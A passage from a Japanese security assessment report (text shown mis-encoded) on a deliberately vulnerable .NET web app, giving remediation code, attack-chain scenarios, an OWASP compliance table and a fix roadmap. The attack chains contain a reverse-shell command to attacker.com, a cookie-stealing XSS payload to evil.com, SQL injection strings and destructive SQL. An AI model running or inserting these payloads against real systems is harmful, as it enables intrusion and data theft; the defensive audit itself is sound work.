å„ªå…ˆåº¦: ğŸŸ  æ—©æ€¥ã«å¯¾å¿œï¼ˆP1ï¼‰

**ä¿®æ­£å‰**:
```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123"
  }
}
```

**ä¿®æ­£å¾Œ**:
```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Host=db;Port=5432;Database=vulndb;Username=${DB_USER};Password=${DB_PASSWORD};SSL Mode=Require;Trust Server Certificate=false;Certificate=client.crt;Certificate Key=client.key"
  }
}
```

**PostgreSQL SSLè¨­å®š**:
```yaml
# docker-compose.yml
db:
  image: postgres:16-alpine
  volumes:
    - ./certs/server.crt:/var/lib/postgresql/server.crt:ro
    - ./certs/server.key:/var/lib/postgresql/server.key:ro
  command: >
    postgres
    -c ssl=on
    -c ssl_cert_file=/var/lib/postgresql/server.crt
    -c ssl_key_file=/var/lib/postgresql/server.key
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **SSLè¨¼æ˜æ›¸ã®ç”Ÿæˆã¨ç®¡ç†**
2. **ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆè¨¼æ˜æ›¸èªè¨¼ã®æ¤œè¨**
3. **TLS 1.2ä»¥ä¸Šã®å¼·åˆ¶**

---

#### VULN-011: Dockerã‚³ãƒ³ãƒ†ãƒŠã®rootå®Ÿè¡Œ

- **CWE**: CWE-250: Execution with Unnecessary Privileges
- **OWASP Top 10**: A05:2021 â€“ Security Misconfiguration
- **CVSS v3.1**: **7.2 (High)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: Trivy
- **å ´æ‰€**: Dockerfile (api, frontend, scanner)

**èª¬æ˜**:

ã™ã¹ã¦ã®Dockerã‚³ãƒ³ãƒ†ãƒŠãŒrootæ¨©é™ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒŠã‚¨ã‚¹ã‚±ãƒ¼ãƒ—æ™‚ã®å½±éŸ¿ãŒå¤§ãããªã‚Šã¾ã™ã€‚

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ  æ—©æ€¥ã«å¯¾å¿œï¼ˆP1ï¼‰

**ä¿®æ­£å‰**:
```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:10.0-preview
WORKDIR /app
COPY --from=build /app/publish .
ENTRYPOINT ["dotnet", "VulnApi.dll"]
# USERãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ãªã— â†’ rootã§å®Ÿè¡Œ
```

**ä¿®æ­£å¾Œ**:
```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:10.0-preview
WORKDIR /app

# érootãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ
RUN addgroup --gid 1001 appgroup && \
    adduser --uid 1001 --gid 1001 --disabled-password --gecos "" appuser && \
    chown -R appuser:appgroup /app

COPY --from=build --chown=appuser:appgroup /app/publish .

# érootãƒ¦ãƒ¼ã‚¶ãƒ¼ã«åˆ‡ã‚Šæ›¿ãˆ
USER appuser

ENTRYPOINT ["dotnet", "VulnApi.dll"]
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **èª­ã¿å–ã‚Šå°‚ç”¨ãƒ«ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ **
2. **Capabilitiesã®åˆ¶é™**
3. **seccomp/AppArmorãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®é©ç”¨**

---

### 1.3 Medium ãƒ¬ãƒ™ãƒ«ï¼ˆ5ä»¶ï¼‰

---

#### VULN-012: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã®æ¬ å¦‚

- **CWE**: CWE-693: Protection Mechanism Failure
- **OWASP Top 10**: A05:2021 â€“ Security Misconfiguration
- **CVSS v3.1**: **5.3 (Medium)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: Nikto, OWASP ZAP
- **æ¤œè¨¼ID**: V-15
- **å ´æ‰€**: nginx.conf, Program.cs

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ¡ è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆP2ï¼‰

**ä¿®æ­£å¾Œï¼ˆnginx.confï¼‰**:
```nginx
server {
    listen 80;
    
    # ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:;" always;
    
    # ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³éè¡¨ç¤º
    server_tokens off;
    
    location / {
        root /usr/share/nginx/html;
        try_files $uri $uri/ /index.html;
    }
    
    location /api/ {
        proxy_pass http://api:5000/api/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

**ASP.NET Coreå´ã®è¨­å®šï¼ˆProgram.csï¼‰**:
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Add("X-Frame-Options", "DENY");
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
    context.Response.Headers.Remove("Server");  // ã‚µãƒ¼ãƒãƒ¼æƒ…å ±ã‚’éè¡¨ç¤º
    
    await next();
});
```

---

#### VULN-013: CORSè¨­å®šã®ä¸å‚™

- **CWE**: CWE-942: Overly Permissive Cross-domain Whitelist
- **OWASP Top 10**: A05:2021 â€“ Security Misconfiguration
- **CVSS v3.1**: **5.3 (Medium)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-13
- **å ´æ‰€**: Program.cs:10-18

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ¡ è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆP2ï¼‰

**ä¿®æ­£å‰**:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin()    // â† å±é™º
              .AllowAnyMethod()
              .AllowAnyHeader();
    });
});
```

**ä¿®æ­£å¾Œ**:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        var allowedOrigins = builder.Configuration
            .GetSection("AllowedOrigins")
            .Get<string[]>() ?? new[] { "http://localhost:3000" };
        
        policy.WithOrigins(allowedOrigins)
              .WithMethods("GET", "POST", "PUT", "DELETE")
              .WithHeaders("Content-Type", "Authorization")
              .AllowCredentials();
    });
});
```

**appsettings.json**:
```json
{
  "AllowedOrigins": [
    "http://localhost:3000",
    "https://example.com"
  ]
}
```

---

#### VULN-014: ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®æ¬ å¦‚

- **CWE**: CWE-307: Improper Restriction of Excessive Authentication Attempts
- **OWASP Top 10**: A07:2021 â€“ Identification and Authentication Failures
- **CVSS v3.1**: **5.3 (Medium)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curlï¼ˆãƒ«ãƒ¼ãƒ—æ¤œè¨¼ï¼‰
- **æ¤œè¨¼ID**: V-19

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ¡ è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆP2ï¼‰

**ä¿®æ­£æ–¹æ³•**:
```csharp
// Program.cs
using Microsoft.AspNetCore.RateLimiting;
using System.Threading.RateLimiting;

builder.Services.AddRateLimiter(options =>
{
    options.RejectionStatusCode = 429;
    
    // ãƒ­ã‚°ã‚¤ãƒ³ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆç”¨
    options.AddFixedWindowLimiter("login", opt =>
    {
        opt.Window = TimeSpan.FromMinutes(1);
        opt.PermitLimit = 5;
        opt.QueueLimit = 0;
    });
    
    // ä¸€èˆ¬APIç”¨
    options.AddFixedWindowLimiter("api", opt =>
    {
        opt.Window = TimeSpan.FromMinutes(1);
        opt.PermitLimit = 100;
        opt.QueueLimit = 0;
    });
});

var app = builder.Build();

app.UseRateLimiter();

// AuthController.cs
[HttpPost]
[EnableRateLimiting("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // ...
}
```

---

#### VULN-015: è©³ç´°ã‚¨ãƒ©ãƒ¼æƒ…å ±ã®éœ²å‡º

- **CWE**: CWE-209: Generation of Error Message Containing Sensitive Information
- **OWASP Top 10**: A04:2021 â€“ Insecure Design
- **CVSS v3.1**: **5.3 (Medium)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-17

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ¡ è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆP2ï¼‰

**ä¿®æ­£å‰**:
```csharp
catch (Exception ex)
{
    return StatusCode(500, new { 
        error = ex.Message, 
        stackTrace = ex.StackTrace  // â† å±é™º
    });
}
```

**ä¿®æ­£å¾Œ**:
```csharp
catch (Exception ex)
{
    _logger.LogError(ex, "Error processing request");
    
    if (app.Environment.IsDevelopment())
    {
        return StatusCode(500, new { error = ex.Message });
    }
    else
    {
        return StatusCode(500, new { error = "An internal error occurred" });
    }
}
```

---

#### VULN-016: ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±æ¼æ´©

- **CWE**: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP Top 10**: A05:2021 â€“ Security Misconfiguration
- **CVSS v3.1**: **5.3 (Medium)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-16

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸŸ¡ è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆP2ï¼‰

æ—¢ã« **VULN-012** ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼è¨­å®šã«å«ã¾ã‚Œã¦ã„ã¾ã™ï¼ˆ`server_tokens off`, `Server`ãƒ˜ãƒƒãƒ€ãƒ¼å‰Šé™¤ï¼‰ã€‚

---

## 2. æ”»æ’ƒãƒã‚§ãƒ¼ãƒ³åˆ†æ

### 2.1 ã‚·ãƒŠãƒªã‚ª1: èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ â†’ å…¨ãƒ‡ãƒ¼ã‚¿æ¼æ´©

**æ”»æ’ƒãƒ‘ã‚¹**:
1. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼ˆ**VULN-001**ï¼‰
   - `POST /api/login` ã« `username: admin' OR '1'='1` ã‚’é€ä¿¡
   - ç®¡ç†è€…ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³æˆåŠŸ
2. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã®å–å¾—ï¼ˆ**VULN-003**, **VULN-004**ï¼‰
   - `profileImageUrl` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰çµŒç”±ã§ `SELECT * FROM users` ã‚’å®Ÿè¡Œ
   - å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ï¼ˆ**VULN-009**ï¼‰
3. Mass Assignmentã«ã‚ˆã‚‹æ°¸ç¶šçš„ãƒãƒƒã‚¯ãƒ‰ã‚¢ä½œæˆï¼ˆ**VULN-007**ï¼‰
   - `POST /api/users` ã§ `role: admin` ã‚’æŒ‡å®šã—ã¦ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆ

**æœ€çµ‚çš„ãªå½±éŸ¿**: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã®å®Œå…¨æŒæ¡ã€æ°¸ç¶šçš„ã‚¢ã‚¯ã‚»ã‚¹

---

### 2.2 ã‚·ãƒŠãƒªã‚ª2: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç›´æ¥æ”»æ’ƒ

**æ”»æ’ƒãƒ‘ã‚¹**:
1. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆã«ç›´æ¥æ¥ç¶šï¼ˆ**VULN-005**ï¼‰
   - `psql -h localhost -p 15432 -U postgres`
   - ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰: postgres123
2. å…¨ãƒ‡ãƒ¼ã‚¿ã®èª­ã¿å–ã‚Š
   - `SELECT * FROM users;`
   - å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€å…¨ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ï¼ˆ**VULN-009**ï¼‰
3. ãƒ‡ãƒ¼ã‚¿ã®æ”¹ã–ã‚“ãƒ»å‰Šé™¤
   - `UPDATE users SET role='admin' WHERE username='attacker';`
   - `DROP TABLE users;`

**æœ€çµ‚çš„ãªå½±éŸ¿**: ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å®Œå…¨ã«è¿‚å›

---

### 2.3 ã‚·ãƒŠãƒªã‚ª3: RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
1. å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ”»æ’ƒï¼ˆ**VULN-002**ï¼‰
   - `POST /api/import` ã«æ‚ªæ„ã®ã‚ã‚‹JSONãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡
   - ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ
2. ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ç¢ºç«‹
   - `nc -e /bin/bash attacker.com 4444`
3. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹èªè¨¼æƒ…å ±ã®çªƒå–
   - `cat /app/appsettings.json`
4. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆ**VULN-005**ï¼‰

**æœ€çµ‚çš„ãªå½±éŸ¿**: ã‚µãƒ¼ãƒãƒ¼ã®å®Œå…¨æŒæ¡ã€ä»–ã‚·ã‚¹ãƒ†ãƒ ã¸ã®æ”»æ’ƒã®è¸ã¿å°åŒ–

---

### 2.4 ã‚·ãƒŠãƒªã‚ª4: XSS â†’ ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯

**æ”»æ’ƒãƒ‘ã‚¹**:
1. Stored XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æ³¨å…¥ï¼ˆ**VULN-008**ï¼‰
   - `profileImageUrl` ã« `<script>fetch('https://evil.com?cookie='+document.cookie)</script>` ã‚’ä¿å­˜
2. ç®¡ç†è€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼è©³ç´°ãƒšãƒ¼ã‚¸ã‚’é–²è¦§
   - XSSãŒç™ºç«ã—ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³CookieãŒæ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡
3. ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯
   - æ”»æ’ƒè€…ãŒç®¡ç†è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨
4. èªè¨¼ãƒã‚¤ãƒ‘ã‚¹å‰Šé™¤æ“ä½œï¼ˆ**VULN-006**ï¼‰
   - `DELETE /api/users/{id}` ã§ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤

**æœ€çµ‚çš„ãªå½±éŸ¿**: ç®¡ç†è€…æ¨©é™ã®ä¸æ­£ä½¿ç”¨ã€ãƒ‡ãƒ¼ã‚¿å‰Šé™¤

---

## 3. OWASP Top 10 æº–æ‹ çŠ¶æ³

| # | ã‚«ãƒ†ã‚´ãƒª | ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ | è©²å½“è„†å¼±æ€§ | å¯¾å¿œå„ªå…ˆåº¦ |
|---|---------|-----------|-----------|-----------|
| A01 | Broken Access Control | âŒ ä¸é©åˆ | VULN-006, VULN-007 | P0 |
| A02 | Cryptographic Failures | âŒ ä¸é©åˆ | VULN-005, VULN-009, VULN-010 | P0 |
| A03 | Injection | âŒ ä¸é©åˆ | VULN-001, VULN-003, VULN-004, VULN-008 | P0 |
| A04 | Insecure Design | âŒ ä¸é©åˆ | VULN-015 | P2 |
| A05 | Security Misconfiguration | âŒ ä¸é©åˆ | VULN-005, VULN-011, VULN-012, VULN-013, VULN-016 | P1-P2 |
| A06 | Vulnerable and Outdated Components | âš ï¸ è¦ç¢ºèª | ï¼ˆä¾å­˜ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®å®šæœŸæ›´æ–°ãŒå¿…è¦ï¼‰ | P3 |
| A07 | Identification and Authentication Failures | âŒ ä¸é©åˆ | VULN-001, VULN-014 | P0-P2 |
| A08 | Software and Data Integrity Failures | âŒ ä¸é©åˆ | VULN-002 | P0 |
| A09 | Security Logging and Monitoring Failures | âš ï¸ éƒ¨åˆ†çš„ã«ä¸é©åˆ | ï¼ˆç›£æŸ»ãƒ­ã‚°ã®å®Ÿè£…ãŒå¿…è¦ï¼‰ | P3 |
| A10 | Server-Side Request Forgery (SSRF) | âœ… è©²å½“ãªã— | - | - |

**ç·åˆè©•ä¾¡**: **10ã‚«ãƒ†ã‚´ãƒªä¸­8ã‚«ãƒ†ã‚´ãƒªã§è„†å¼±æ€§ã‚ã‚Šï¼ˆ80%ä¸é©åˆï¼‰**

---

## 4. æ˜¯æ­£ææ¡ˆã‚µãƒãƒªãƒ¼

### å³åº§ã«å¯¾å¿œï¼ˆ1-2é€±é–“ä»¥å†…ã€P0ï¼‰

| # | å¯¾è±¡ | æ˜¯æ­£å†…å®¹ | å·¥æ•°è¦‹ç© |
|---|------|---------|---------|
| 1 | å…¨SQLã‚¯ã‚¨ãƒª | ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã¸ã®å¤‰æ›´ | 3æ—¥ |
| 2 | AuthController.cs | BCryptã«ã‚ˆã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥åŒ–ã®å®Ÿè£… | 2æ—¥ |
| 3 | UsersController.cs | APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰passwordãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰å‰Šé™¤ | 1æ—¥ |
| 4 | FileController.cs | TypeNameHandling.Allã®å‰Šé™¤ã€System.Text.Jsonã¸ã®ç§»è¡Œ | 2æ—¥ |
| 5 | docker-compose.yml | DBãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹ã®å‰Šé™¤ã€ç’°å¢ƒå¤‰æ•°åŒ– | 1æ—¥ |
| 6 | å…¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ | JWTèªè¨¼ãƒ»èªå¯ã®å®Ÿè£… | 3æ—¥ |
| 7 | UserDetail.tsx | dangerouslySetInnerHTMLã®å‰Šé™¤ | 1æ—¥ |
| 8 | UsersController.cs | Mass Assignmentå¯¾ç­–ï¼ˆDTOã®ä½¿ç”¨ï¼‰ | 2æ—¥ |
| 9 | init.sql | password â†’ password_hash ã¸ã®ç§»è¡Œ | 1æ—¥ |

**åˆè¨ˆ**: ç´„16æ—¥ï¼ˆ2.5é€±é–“ï¼‰

---

### è¨ˆç”»çš„ã«å¯¾å¿œï¼ˆ1-3ãƒ¶æœˆä»¥å†…ã€P1-P2ï¼‰

| # | å¯¾è±¡ | æ˜¯æ­£å†…å®¹ | å·¥æ•°è¦‹ç© |
|---|------|---------|---------|
| 10 | Dockerfile (å…¨) | érootãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è¨­å®š | 1æ—¥ |
| 11 | PostgreSQL | SSL/TLSæ¥ç¶šã®æœ‰åŠ¹åŒ– | 2æ—¥ |
| 12 | nginx.conf, Program.cs | ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã®è¿½åŠ  | 1æ—¥ |
| 13 | Program.cs | CORSè¨­å®šã®åˆ¶é™ | 0.5æ—¥ |
| 14 | Program.cs | ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®å®Ÿè£… | 1æ—¥ |
| 15 | å…¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ | ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã®æ”¹å–„ | 2æ—¥ |

**åˆè¨ˆ**: ç´„7.5æ—¥ï¼ˆ1.5é€±é–“ï¼‰

---

### æ¨å¥¨äº‹é …ï¼ˆæ¬¡æœŸé–‹ç™ºæ™‚ã€P3ï¼‰

| # | å¯¾è±¡ | ææ¡ˆå†…å®¹ |
|---|------|---------|
| 16 | ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ | ORMã®å°å…¥ï¼ˆEntity Framework Coreï¼‰ |
| 17 | èªè¨¼ | MFAï¼ˆå¤šè¦ç´ èªè¨¼ï¼‰ã®å®Ÿè£… |
| 18 | ç›£è¦– | ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ãƒ­ã‚°ã®å®Ÿè£… |
| 19 | CI/CD | SAST/DASTãƒ„ãƒ¼ãƒ«ã®çµ±åˆ |
| 20 | ä¾å­˜ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ | Dependabot/Renovateã®è¨­å®š |
| 21 | ã‚³ãƒ³ãƒ†ãƒŠ | seccomp/AppArmorãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®é©ç”¨ |
| 22 | ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ | è«–ç†å‰Šé™¤ã¸ã®å¤‰æ›´ |

---

## 5. ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ”¹å–„ãƒ­ãƒ¼ãƒ‰ãƒãƒƒãƒ—

### Phase 1: ç·Šæ€¥å¯¾å¿œï¼ˆWeek 1-2ï¼‰

**ç›®æ¨™**: Criticalè„†å¼±æ€§ã®æ˜¯æ­£

- [ ] SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å…¨ç®‡æ‰€ã®ä¿®æ­£ï¼ˆVULN-001, 003, 004ï¼‰
- [ ] èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ã®ä¿®æ­£ï¼ˆVULN-006ï¼‰
- [ ] RCEè„†å¼±æ€§ã®ä¿®æ­£ï¼ˆVULN-002ï¼‰
- [ ] ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜ã®ä¿®æ­£ï¼ˆVULN-009ï¼‰
- [ ] DBãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹ã®å‰Šé™¤ï¼ˆVULN-005ï¼‰

**å®Œäº†åŸºæº–**: CVSS 9.0ä»¥ä¸Šã®è„†å¼±æ€§ãŒã‚¼ãƒ­ã«ãªã‚‹

---

### Phase 2: åŸºç›¤å¼·åŒ–ï¼ˆWeek 3-8ï¼‰

**ç›®æ¨™**: High/Mediumè„†å¼±æ€§ã®æ˜¯æ­£ã€ã‚»ã‚­ãƒ¥ã‚¢ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®æ§‹ç¯‰

- [ ] JWTèªè¨¼ãƒ»èªå¯ã®å®Ÿè£…
- [ ] SSL/TLSæ¥ç¶šã®æœ‰åŠ¹åŒ–ï¼ˆVULN-010ï¼‰
- [ ] Dockerã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å¼·åŒ–ï¼ˆVULN-011ï¼‰
- [ ] XSSå¯¾ç­–ã®å®Ÿè£…ï¼ˆVULN-008ï¼‰
- [ ] Mass Assignmentå¯¾ç­–ï¼ˆVULN-007ï¼‰
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã®è¨­å®šï¼ˆVULN-012ï¼‰
- [ ] CORSè¨­å®šã®åˆ¶é™ï¼ˆVULN-013ï¼‰
- [ ] ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®å®Ÿè£…ï¼ˆVULN-014ï¼‰

**å®Œäº†åŸºæº–**: CVSS 5.0ä»¥ä¸Šã®è„†å¼±æ€§ãŒã‚¼ãƒ­ã«ãªã‚‹

---

### Phase 3: ç¶™ç¶šçš„æ”¹å–„ï¼ˆMonth 3-6ï¼‰

**ç›®æ¨™**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è‡ªå‹•åŒ–ã€ç›£è¦–ä½“åˆ¶ã®æ§‹ç¯‰

- [ ] SAST/DASTã®CI/CDçµ±åˆ
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ãƒ­ã‚°ã®å®Ÿè£…
- [ ] ä¾µå…¥æ¤œçŸ¥ã‚·ã‚¹ãƒ†ãƒ ã®å°å…¥
- [ ] å®šæœŸçš„ãªè„†å¼±æ€§è¨ºæ–­ã®è‡ªå‹•åŒ–
- [ ] ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆå¯¾å¿œæ‰‹é †ã®ç­–å®š
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒˆãƒ¬ãƒ¼ãƒ‹ãƒ³ã‚°ã®å®Ÿæ–½

**å®Œäº†åŸºæº–**: DevSecOpsãƒ—ãƒ­ã‚»ã‚¹ã®ç¢ºç«‹

---

## 6. ä»˜éŒ²

### 6.1 ä½¿ç”¨ãƒ„ãƒ¼ãƒ«ä¸€è¦§

| ãƒ„ãƒ¼ãƒ« | ãƒãƒ¼ã‚¸ãƒ§ãƒ³ | ç”¨é€” | æ¤œå‡ºè„†å¼±æ€§æ•° |
|--------|-----------|------|-------------|
| OWASP ZAP | 2.16.1 | Webã‚¢ãƒ—ãƒªã‚¹ã‚­ãƒ£ãƒ³ | 239ä»¶ï¼ˆ17 Highï¼‰ |
| sqlmap | 1.7.x | SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ¤œè¨¼ | 5ç®‡æ‰€ |
| Nmap | 7.93 | ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ã‚­ãƒ£ãƒ³ | 1ä»¶ï¼ˆèª¤æ¤œçŸ¥ï¼‰ |
| Trivy | 0.58 | ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚¹ã‚­ãƒ£ãƒ³ | 4ä»¶ï¼ˆ1 Criticalï¼‰ |
| Nikto | 2.6.0 | Webã‚µãƒ¼ãƒãƒ¼æ¤œæŸ» | 10ä»¶ï¼ˆãƒ˜ãƒƒãƒ€ãƒ¼ä¸è¶³ï¼‰ |
| curl | - | æ‰‹å‹•æ¤œè¨¼ | 10ä»¶ |
| Playwright | - | E2Eãƒ†ã‚¹ãƒˆ | 2ä»¶ |

---
